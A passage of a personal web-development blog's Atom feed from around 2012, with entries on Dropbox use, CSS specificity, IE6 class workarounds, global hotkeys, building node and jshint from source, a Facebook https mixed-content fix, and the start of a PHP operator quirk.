&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;cat file.txt &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; tr &lt;span class=&quot;s1&quot;&gt;&amp;#39; &amp;#39;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; tr &lt;span class=&quot;s1&quot;&gt;&amp;#39;\t&amp;#39;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; grep http &amp;gt; list.txt
wget --no-clobber -i list.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This took a while to download as there are more than 400 files, but that way
I&amp;#39;ll have some interesting talks to listen to during my trip.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Productivity tip #2 : Use a Dropbox</title>
   <link href="http://blog.pixelastic.com/2012/01/17/productivity-tip-2-dropbox/"/>
   <updated>2012-01-17T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2012/01/17/productivity-tip-2-dropbox</id>
   <content type="html">&lt;p&gt;Here&amp;#39;s one more post in my productivity serie. This one is about the Dropbox
service.&lt;/p&gt;

&lt;h2&gt;What is Dropbox ?&lt;/h2&gt;

&lt;p&gt;In a nutshell, Dropbox is a private hosting service, based on a cloud
infrastructure. Once you&amp;#39;ve installed the app, one of your folders (default to
&lt;code&gt;~/Dropbox&lt;/code&gt;) became synchronized with your Dropbox account. Every document
that you save in that folder, and any subfolder you create, will immediatly be
saved online in your Dropbox account.&lt;/p&gt;

&lt;p&gt;In the real world, it means that you can easily share one folder and all its
documents easily between all your computers. If you don&amp;#39;t want to install the
app, you can simply log to &lt;a href=&quot;http://www.dropbox.com&quot;&gt;dropbox.com&lt;/a&gt; and
download/upload any file you want.&lt;/p&gt;

&lt;h2&gt;How I use it&lt;/h2&gt;

&lt;p&gt;There a few ways you can use Dropbox. Here are a few of mine, feel free to add
yours in the comments.&lt;/p&gt;

&lt;p&gt;As I used to work on Windows (and I still have to sometimes), I always had to
install a bunch of apps on a brand new computer before being able to start
working. This includes the traditional antivirus, browser, music player, IDE,
etc. Instead of going through the laborious process of downloading all the
installer on each of the websites, I&amp;#39;ve saved them in my Dropbox and I just
have to install Dropbox, then install the apps I need.&lt;/p&gt;

&lt;p&gt;Instead of a bunch of &lt;code&gt;todo.txt&lt;/code&gt; files spread accross all your computers,
wouldn&amp;#39;t it be tidier to only have one, shared ?&lt;/p&gt;

&lt;p&gt;The same goes for the KeePass file, so you can have an easy access to all your
passwords.&lt;/p&gt;

&lt;p&gt;I also use it to synchronize my Tomboy notes between my computers (I&amp;#39;ll go
into more details in another note).&lt;/p&gt;

&lt;p&gt;It might be a bit excessive, but I personnally also share my icons, sounds,
wallpapers and other customization stuff, so I won&amp;#39;t feel lost on a new
computer.&lt;/p&gt;

&lt;p&gt;Thanks to the amazing &lt;a href=&quot;http://www.getdoxie.com&quot;&gt;Doxie scanner&lt;/a&gt; (more on that
on another note), I&amp;#39;m now a scan junkie. I scan all the official paperwork I
got in my physical mailbox and store it in the Dropbox.&lt;/p&gt;

&lt;p&gt;Be it a bill or a banking receipt, I scan anything that looks like official
and that I might need again one day. That way, I know I can always connect to
&lt;a href=&quot;http://www.dropbox.com&quot;&gt;dropbox.com&lt;/a&gt; and find any official document of the
past 5 years in a matter of minutes. This saved my day quite a few time
already !&lt;/p&gt;

&lt;h2&gt;Last words&lt;/h2&gt;

&lt;p&gt;Dropbox is a free service. You can have 2Go for free, or pay for a more space.
I personnaly only use a fraction of that so I stay on the free plan. I haven&amp;#39;t
mentionned it because I don&amp;#39;t use it, but you can also share some folders with
other Dropbox users, which is a nice addition when working on the same
project.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>The :visited pseudo-class specificity gotcha</title>
   <link href="http://blog.pixelastic.com/2012/01/07/visited-pseudo-class-specificity-gotcha/"/>
   <updated>2012-01-07T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2012/01/07/visited-pseudo-class-specificity-gotcha</id>
   <content type="html">&lt;p&gt;In a &lt;a href=&quot;/blog/333:alternative-multiples-classes-ie6&quot;&gt;previous post&lt;/a&gt;, I bloggued
about the way to emulate OOCSS behavior with multiple classes in IE6.&lt;/p&gt;

&lt;p&gt;Today, I&amp;#39;ll do a follow up and write about a possible gotcha involving the
&lt;code&gt;:visited&lt;/code&gt; pseudo class.&lt;/p&gt;

&lt;p&gt;Following the previous example let&amp;#39;s imagine you have a styling for your
defauls links (&lt;code&gt;a { color:blue; }&lt;/code&gt;), one for the default buttons (&lt;code&gt;.button {
... }&lt;/code&gt; ) and one for a custom button that extend the &lt;code&gt;.button&lt;/code&gt; (&lt;code&gt;.customButton
{ ... }&lt;/code&gt;)&lt;/p&gt;

&lt;p&gt;Now, imagine that you&amp;#39;ll want to style all &lt;code&gt;:visited&lt;/code&gt; links the same way non-
visited links are styled. You might write something like :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nt&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;:visited&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;blue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Unfortunatly, this will have some nasty side effects on your &lt;code&gt;.button&lt;/code&gt; and
&lt;code&gt;.customButton&lt;/code&gt; rules becauseÂ &lt;code&gt;a:visited&lt;/code&gt; will have precedence over &lt;code&gt;.button&lt;/code&gt;
and &lt;code&gt;.customButton&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;You can find more information about CSS specificity in this &lt;a href=&quot;http://www.stuffandnonsense.co.uk/archives/css_specificity_wars.html&quot;&gt;Star
Wars&lt;/a&gt;
post.&lt;/p&gt;

&lt;p&gt;Your first solution could be to add even more specificity to your own rules,
to override the &lt;code&gt;a:visited&lt;/code&gt; one, like so :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nc&quot;&gt;.button&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;.button&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;:visited&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;.customButton&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;.customButton&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;:visited&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This will work, of course, but you&amp;#39;re only adding complexity to your
specificities, and this get more and more tedious the more you add other
customised buttons.&lt;/p&gt;

&lt;p&gt;In fact, there is a much better way, one that you could throw in your
&lt;code&gt;reset.css&lt;/code&gt; if it isn&amp;#39;t there already :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nt&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;:visited&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;inherit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;That way, all your visited links will inherit their color from their non-
visited version. This mean that visited &lt;code&gt;.button&lt;/code&gt; will use the &lt;code&gt;.button&lt;/code&gt;
color, visited &lt;code&gt;.customButton&lt;/code&gt; will use &lt;code&gt;.customButton&lt;/code&gt; color and simple
visited links will use the &lt;code&gt;a&lt;/code&gt; color.&lt;/p&gt;

&lt;p&gt;Of course, if you defined a &lt;code&gt;background-color&lt;/code&gt; in your &lt;code&gt;a&lt;/code&gt;, you should define
a &lt;code&gt;background-color:inherit&lt;/code&gt; in your &lt;code&gt;a:visited&lt;/code&gt; too.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Alternative way for multiple classes in IE6</title>
   <link href="http://blog.pixelastic.com/2012/01/06/alternative-multiple-classes-ie6/"/>
   <updated>2012-01-06T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2012/01/06/alternative-multiple-classes-ie6</id>
   <content type="html">&lt;p&gt;In a pure OOCSS style of writing CSS, let&amp;#39;s imagine you created a css class of
&lt;code&gt;.button&lt;/code&gt; that visually turns a simple link into a button.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;#&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;button&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;I&amp;#39;m a button&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, if you want to define a custom version of your button, let&amp;#39;s say a button
that will trigger a very dangerous action, you might want to style it
differently, so our user will think twice before hitting it.&lt;/p&gt;

&lt;p&gt;You got two ways of achieving this, depending if you still support IE6 or not.&lt;/p&gt;

&lt;h2&gt;Simple way for non-IE6&lt;/h2&gt;

&lt;p&gt;If you don&amp;#39;t care about IE6 (and hell, it&amp;#39;s 2012, you shouldn&amp;#39;t), you just
have to add a second class to your button/link :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;#&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;button dangerous&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;I&amp;#39;m a dangerous button&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And in your CSS file, just define some special styles (like a red
&lt;code&gt;background&lt;/code&gt;) to your dangerous button.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nc&quot;&gt;.button.dangerous&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Actually, that&amp;#39;s the path followed by &lt;a href=&quot;http://twitter.github.com/bootstrap/&quot;&gt;Bootstrap
&lt;/a&gt;(among others). But it will not
correctly work in IE6, because it does not understand multiple classes rules.
Instead, IE6 will read &lt;code&gt;.button.dangerous {}&lt;/code&gt; the same as &lt;code&gt;.dangerous {}&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This will cause problems as soon as you&amp;#39;ll use the &lt;code&gt;.important&lt;/code&gt; class on
something else than a &lt;code&gt;.button&lt;/code&gt; : IE will apply the &lt;code&gt;.button.dangerous&lt;/code&gt; rules
to anything with the &lt;code&gt;.dangerous&lt;/code&gt; class.&lt;/p&gt;

&lt;h2&gt;Other way, for IE6&lt;/h2&gt;

&lt;p&gt;The solution I personnaly use to fix IE6 is to use more explicit classes
instead of using multiple ones. For example, instead of &lt;code&gt;.button.dangerous {}&lt;/code&gt;
I&amp;#39;ll use &lt;code&gt;.buttonDangerous {}&lt;/code&gt; and write my html like this :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;#&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;button buttonDangerous&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;I&amp;#39;m a dangerous button, even on IE6&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;That way, the link will have both the styles of &lt;code&gt;.button&lt;/code&gt; and
&lt;code&gt;.buttonDangerous&lt;/code&gt;. This will assure cross compatibility with IE6, at the
expense of a (arguably) less readable markup.&lt;/p&gt;

&lt;p&gt;As of today, I hope that I&amp;#39;ll never have to code for IE6 websites again, but
if you ever need to, that&amp;#39;s a little trick that can really help.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Productivity tip #1 : Using global hotkeys</title>
   <link href="http://blog.pixelastic.com/2012/01/05/productivity-tip-1-global-hotkeys/"/>
   <updated>2012-01-05T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2012/01/05/productivity-tip-1-global-hotkeys</id>
   <content type="html">&lt;p&gt;This post will be the first of what I hope will be a long serie of posts. I&amp;#39;ll
blog about some of the little tricks I&amp;#39;ve learn in the past years that make me
go faster on my daily job.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ll start with something I can no longer work without : my global hotkeys.&lt;/p&gt;

&lt;p&gt;The concept is pretty simple, I&amp;#39;ve binded some keys combinations to launch
specific applications or directories. It might not seem very important, but it
does make you gain a tremendous amount of time for those apps you launch
pretty often like browser, IDE, or project directory.&lt;/p&gt;

&lt;p&gt;I used to work on Windows, and I then used a little script named
&lt;a href=&quot;http://www.autohotkey.com/&quot;&gt;AutoHotKey&lt;/a&gt; to bind my keys. The script even
comes packaged with its own language if you ever want to script complicated
stuff.&lt;/p&gt;

&lt;p&gt;I&amp;#39;m now working under Ubuntu, and the global hotkeys can be defined directly
from the System Settings (in 11.10 it&amp;#39;s &lt;code&gt;System Settings &amp;gt; Keyboard &amp;gt;
Shortcuts &amp;gt; Custom Shortcuts&lt;/code&gt;)&lt;/p&gt;

&lt;h2&gt;Opening apps&lt;/h2&gt;

&lt;p&gt;I choose a key combination hard enough to type so I won&amp;#39;t type it by mistake,
but easy enough to remember that I could type it whenever I want.&lt;/p&gt;

&lt;p&gt;For example, I binded all the app I use the most to a &lt;code&gt;Ctrl+Win+{Letter}&lt;/code&gt;
combination. &lt;code&gt;Ctrl+Win+C&lt;/code&gt; opens Chromium, &lt;code&gt;Ctrl+Win+F&lt;/code&gt; opens Firefox,
&lt;code&gt;Ctrl+Win+T&lt;/code&gt; opens Trillian, etc.&lt;/p&gt;

&lt;h2&gt;Opening folders&lt;/h2&gt;

&lt;p&gt;I used a close combination for opening directories : &lt;code&gt;Ctrl+Win+Alt+{Letter}&lt;/code&gt;.
Those three keys are side by side on most keyboards so pressing them is easy.&lt;/p&gt;

&lt;p&gt;This time I used the letter &lt;code&gt;H&lt;/code&gt; for my home folder, &lt;code&gt;D&lt;/code&gt; for the Dropbox
folder, &lt;code&gt;W&lt;/code&gt; for &lt;code&gt;/var/www&lt;/code&gt;, etc, etc.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve tweaked my keyboard in a few other ways, but this will be the subject of
another post. Hope this one gave you some ideas.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Installing jshint with node v0.6.6</title>
   <link href="http://blog.pixelastic.com/2012/01/04/installing-jshint-node-v0-6/"/>
   <updated>2012-01-04T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2012/01/04/installing-jshint-node-v0-6</id>
   <content type="html">&lt;p&gt;Yesterday, I&amp;#39;ve tried to install nodejs and the jshint package to add
automatic jshint parsing to my vim.&lt;/p&gt;

&lt;p&gt;Well, it wasn&amp;#39;t so simple due to a bug in the npm version shipped with node.&lt;/p&gt;

&lt;p&gt;Here are the complete commands to run to make it work, in case I had to do it
again :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Download and extract node&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~/local/src
wget http://nodejs.org/dist/v0.6.6/node-v0.6.6.tar.gz
tar xvzf node-v0.6.6.tar.gz
rm node-v0.6.6.tar.gz
&lt;span class=&quot;c&quot;&gt;# Compile and install&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;node-v0.6.6
./configure
make
sudo make install
&lt;span class=&quot;c&quot;&gt;# Update npm&lt;/span&gt;
sudo npm install npm@alpha -g
&lt;span class=&quot;c&quot;&gt;# (Optional) Clear npm cache&lt;/span&gt;
npm cache clean jshint
&lt;span class=&quot;c&quot;&gt;# Install jshint&lt;/span&gt;
sudo npm install jshint -g
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Source :Â &lt;a href=&quot;https://github.com/isaac%0As/npm/issues/1888&quot;&gt;https://github.com/isaacs/npm/issues/1888&lt;/a&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Facebook https mixed content warning on IE9</title>
   <link href="http://blog.pixelastic.com/2012/01/04/facebook-https-mixed-content-warning-ie9/"/>
   <updated>2012-01-04T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2012/01/04/facebook-https-mixed-content-warning-ie9</id>
   <content type="html">&lt;p&gt;When browsing the web, you might have seen a &amp;quot;mixed content warning&amp;quot; popup
show in your browser. They are most of the time poorly worded and their
meaning is quite obscure.&lt;/p&gt;

&lt;p&gt;What it means is that your are currently browsing a page with both &lt;code&gt;http&lt;/code&gt;and
&lt;code&gt;https&lt;/code&gt;content. Typically, if your page is &lt;code&gt;https&lt;/code&gt;but one of the css, js or
image file it contains is requested through &lt;code&gt;http&lt;/code&gt;, the warning will pop.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(It&amp;#39;s interesting to note here that not all assets are treated equal. Loading
a flash movie through &lt;code&gt;http&lt;/code&gt;does not trigger the warning).&lt;/em&gt;&lt;/p&gt;

&lt;h2&gt;The IE special case&lt;/h2&gt;

&lt;p&gt;Now, what&amp;#39;s special about IE is that it also trigger the mixed content warning
when content is the other way around. If you&amp;#39;re serving a page through &lt;code&gt;http
&lt;/code&gt;and load assets through &lt;code&gt;https&lt;/code&gt;, it will consider it a mixed content too.&lt;/p&gt;

&lt;p&gt;In a sense, that&amp;#39;s logical, but it needlessly prompt the user with a dialog
that block downloading of all &lt;code&gt;https&lt;/code&gt;assets until confirmed.&lt;/p&gt;

&lt;p&gt;The solution is to make sure that all your assets are loaded with the same
protocol as the host page. An easy way to do so is to use the &lt;code&gt;//&lt;/code&gt; relative
protocol url. This will use &lt;code&gt;http&lt;/code&gt;or &lt;code&gt;https&lt;/code&gt;automatically based on the page
protocol.&lt;/p&gt;

&lt;h2&gt;And adding Facebook to the mix&lt;/h2&gt;

&lt;p&gt;A few months ago, Facebook forced all apps to serve content through &lt;code&gt;https&lt;/code&gt;.
In the meantime, they suggested that all their users browse their website
using &lt;code&gt;https&lt;/code&gt;too.&lt;/p&gt;

&lt;p&gt;Unfortunatly for us, some of our own users had bookmarks in their browsers and
Facebook pages referencing our old
&lt;a href=&quot;http://apps.facebook.com/appname/&quot;&gt;http://apps.facebook.com/appname/&lt;/a&gt; url.
And following that link triggered the dreaded mixed content warning in IE.&lt;/p&gt;

&lt;p&gt;When accessing this page, Facebook was loaded in classic &lt;code&gt;http&lt;/code&gt;but our inner
iframe was loaded through &lt;code&gt;https&lt;/code&gt;. So far, so good.&lt;/p&gt;

&lt;p&gt;The problem came from one of Facebook own javascript SDK included in our app.
This script loaded other scripts based on what it needed.&lt;/p&gt;

&lt;p&gt;Unfortunatly, it loaded the other scripts from an &lt;code&gt;http&lt;/code&gt;(not &lt;code&gt;https&lt;/code&gt;) server.
The SDK has two distinct sets of urls, based on the current page protocol.&lt;/p&gt;

&lt;p&gt;It was wrongly considering being in an &lt;code&gt;http&lt;/code&gt;page, not an &lt;code&gt;https&lt;/code&gt;one, and
thus used the wrong set of urls. This confusing comes from the fact that it
checks the top page protocol instead of checking the current page protocol.&lt;/p&gt;

&lt;p&gt;After some googling, I found a solution that consisted in forcing the SDK to
consider that we are in &lt;code&gt;https&lt;/code&gt;mode by calling : &lt;code&gt;FB._https = true&lt;/code&gt; before
the call to&lt;code&gt;FB.init()&lt;/code&gt;&lt;/p&gt;

&lt;h2&gt;Almost there&lt;/h2&gt;

&lt;p&gt;If correctly forced FB to use the correct set of urls, thus removing the mixed
content warning. And I almost thought it would be that easy.&lt;/p&gt;

&lt;p&gt;It was not.&lt;/p&gt;

&lt;p&gt;This did not fixed the payment popup. All Facebook UI element loaded correctly
(feeds, permissions, requests), but the payment popup.&lt;/p&gt;

&lt;p&gt;I couldn&amp;#39;t find a way to fix that, so I reverted to a more brutal approach.&lt;/p&gt;

&lt;h2&gt;Final and brutal solution&lt;/h2&gt;

&lt;p&gt;All my problems came from the fact that FB thought we were serving &lt;code&gt;http
&lt;/code&gt;while in fact we were serving &lt;code&gt;https&lt;/code&gt;. So the solution, might be to force FB
to serve &lt;code&gt;https&lt;/code&gt;from start to end.&lt;/p&gt;

&lt;p&gt;I wanted to detect if the page was loaded through
&lt;a href=&quot;http://apps.facebook.com/appname/&quot;&gt;http://apps.facebook.com/appname/&lt;/a&gt; or
&lt;a href=&quot;https://apps.facebook.com/appname/&quot;&gt;https://apps.facebook.com/appname/&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Unfortunatly, due to cross domain restrictions in Javascript, we are not able
to read, from inside and iframe, the parent frame properties. So I couldn&amp;#39;t
read &lt;code&gt;top.location.protocol&lt;/code&gt; to easily check if I needed to redirect.&lt;/p&gt;

&lt;p&gt;But, as I mentionned earlier, &lt;code&gt;FB._https&lt;/code&gt; incorrectly report that we are not
in &lt;code&gt;https&lt;/code&gt;because it checks the top protocol. So I used this var, to know if
the parent frame was in the correct protocol or not. Using this own FB bug to
fix itself.&lt;/p&gt;

&lt;p&gt;Now, for the redirect : even if I couldn&amp;#39;t read the&lt;code&gt;top.location&lt;/code&gt;, I could
modify it. I just had to call &lt;code&gt;top.location.url =
&amp;#39;https://apps.facebook.com/appname/&amp;#39;&lt;/code&gt; to redirect the whole page.&lt;/p&gt;

&lt;p&gt;I hardcoded the app url because there was no way to get it from js, and I took
care of keeping any GET parameter passed before the redirect, and I ended up
with this :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;appUrl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;https://apps.facebook.com/appname/&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;iframeUrl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;protocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;//&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pathname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;redirectUrl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;iframeUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;appUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;href&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;redirectUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;FB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;I&amp;#39;m not really proud of this solution, as it is mostly a hack and will force a
useless loading of the http version before loading the https one, but that&amp;#39;s
the best I&amp;#39;ve found. If any of you have a better solution, feel free to
comment.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>PHP AND / OR differences with && / ||</title>
   <link href="http://blog.pixelastic.com/2011/12/02/php-differences/"/>
   <updated>2011-12-02T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2011/12/02/php-differences</id>
   <content type="html">&lt;p&gt;Just found this weird little behavior of PHP today :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;$a = false;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$b = true;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$c = $a OR $b;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$d = ($a OR $b);&lt;/span&gt;
